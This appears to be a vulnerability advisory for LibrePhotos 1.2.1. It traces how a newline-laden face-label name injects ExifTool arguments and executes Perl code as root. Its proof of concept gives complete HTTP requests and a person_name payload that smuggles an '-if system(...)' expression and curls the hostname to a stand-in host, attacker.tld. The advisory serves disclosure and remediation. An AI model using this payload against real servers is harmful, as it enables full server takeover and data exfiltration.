# LibrePhotos 1.2.1 Face-Label ExifTool Argument Injection Remote Code Execution

### Summary

LibrePhotos (LibrePhotos/librephotos, version tag 1.2.1) was confirmed vulnerable to argument injection into ExifTool that leads to remote code execution. The face-label endpoints (`POST /api/addface`, `POST /api/labelfaces`) accept a `person_name` containing newline characters — only leading/trailing whitespace is stripped — and store it in `Person.name` without character validation. When face-tag metadata is written back to photo files, `write_metadata()` builds ExifTool arguments by string interpolation (`f"-{tag}={value}"`) and passes them to the pinned dependency PyExifTool 0.4.9, which joins parameters with newline bytes when writing to the `exiftool -stay_open` stdin. An embedded newline therefore splits the value into additional ExifTool command-line options, and injecting an `-if <Perl expression>` pair makes ExifTool evaluate attacker-controlled Perl code while processing the photo.

The sink-level exploit was dynamically reproduced in an isolated sandbox using the real exiftool (Debian 12 libimage-exiftool-perl) and the project-pinned PyExifTool==0.4.9: parameters were constructed exactly as `writer.py` does, the injected Perl `system()` executed, printed `uid=0(root)`, and created a sentinel file. The Django-side source-to-sink chain was confirmed closed by line-by-line source tracing. In official Docker and standalone deployments the backend runs as root, so this yields full server compromise.

### Details

The attacker-controlled name enters through the face-label endpoints with only `.strip()` applied, so newlines embedded mid-name survive and are persisted (apps/backend/api/views/faces.py:476-477 → api/models/person.py:118-119, a `CharField(max_length=128)` with no character allow-list):

```python
# apps/backend/api/views/faces.py:476-477
def post(self, request, format=None):
    person_name = (request.data.get("person_name") or "").strip()
```

Metadata write-back is triggered either by `POST /api/savemetadata {"types":["face_tags"]}` (api/views/photos.py:933-968) or automatically when the user enables `save_face_tags_to_disk` (faces.py:583-594). The name then flows through `api/models/photo.py:214-227` → `api/metadata/photo_writer.py:49-55` → `api/metadata/face_regions.py:96-127`. There, `_escape_exiftool_value` (lines 73-82) escapes only backslash/braces/equals/comma — not newlines — and the raw name is appended to the `XMP:Subject` list at line 109, giving two independent injection channels.

The sink assembles the ExifTool arguments by interpolation (apps/backend/api/metadata/writer.py:27-36):

```python
params = []
for tag, value in tags.items():
    if isinstance(value, list):
        for item in value:
            params.append(os.fsencode(f"-{tag}={item}"))
    else:
        params.append(os.fsencode(f"-{tag}={value}"))
params.append(b"-overwrite_original")
params.append(os.fsencode(file_path))
et.execute(*params)
```

PyExifTool 0.4.9 (pinned in requirements.txt) joins the batch with newlines and writes it to the stay-open ExifTool process (exiftool/exiftool.py:441-445):

```python
cmd_text = b"\n".join(params + (b"-execute\n",))
self._process.stdin.write(cmd_text)
```

Consequently, every embedded `0x0A` byte in a value becomes an argument delimiter: the forged `-XMP:Subject=<name>` argument splits into independent ExifTool options such as `-if` followed by an arbitrary Perl expression, which ExifTool evaluates per processed file.

This is CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection'), leading to CWE-78: OS Command Injection.

### PoC

#### 1. (Optional, one-shot trigger) Enable immediate write-back on face add

```http
PATCH /api/user/<attacker_user_id>/ HTTP/1.1
Host: TARGET
Authorization: Bearer <access_token>
Content-Type: application/json

{"save_face_tags_to_disk": true}
```

#### 2. Obtain a JWT

```http
POST /api/auth/token/obtain/ HTTP/1.1
Host: TARGET
Content-Type: application/json

{"username": "attacker", "password": "pass"}
```

#### 3. Add a face label whose person_name embeds the Perl payload

The newlines inside `person_name` must be real `0x0A` bytes in mid-name position (they are untouched by the server's `.strip()`):

```http
POST /api/addface HTTP/1.1
Host: TARGET
Authorization: Bearer <access_token>
Content-Type: application/json

{"photo": "<image_hash or photo_uuid>",
 "person_name": "a\n-if\nsystem('id > /tmp/pwn; curl http://attacker.tld/$(hostname|base64 -w0)') // 1\n-b",
 "box": {"top": 0.1, "right": 0.3, "bottom": 0.3, "left": 0.1}}
```

#### 4. Trigger metadata write-back (if save_face_tags_to_disk was not enabled)

```http
POST /api/savemetadata HTTP/1.1
Host: TARGET
Authorization: Bearer <access_token>
Content-Type: application/json

{"types": ["face_tags"]}
```

While processing the attacker's photo, ExifTool evaluates the injected `-if` Perl expression; `system(...)` executes with backend-process privileges.

#### Sandbox verification (Verified 2026-10-05)

End-to-end at the sink with the real toolchain — exiftool 13.x (Debian 12 libimage-exiftool-perl) + PyExifTool 0.4.9, reproducing `write_metadata`'s exact parameter construction (`-XMP:Subject=a`, `-if`, `system(...) // 1`, `-b`, `-overwrite_original`, `/tmp/poc/photo.jpg`):

```
[!] RCE CONFIRMED — Perl executed, command output:
uid=0(root) gid=0(root) groups=0(root)
sentinel file /tmp/poc/RCE_CONFIRMED created
```

### Impact

Any authenticated user can execute arbitrary code on the LibrePhotos server. In official Docker and standalone deployments the backend runs as root, so exploitation yields full server compromise: arbitrary code execution, information disclosure across all user photo libraries, and privilege escalation. Exploitation requires one request chain, no user interaction, and no special configuration.

The audit is based on the version tag 1.2.1 (dev-branch snapshot); the exact affected release range and a fixed version are to be confirmed. Affected components: `write_metadata()` (apps/backend/api/metadata/writer.py:27-36), `face_regions.py:73-127`, and the pinned PyExifTool 0.4.9 batch protocol.
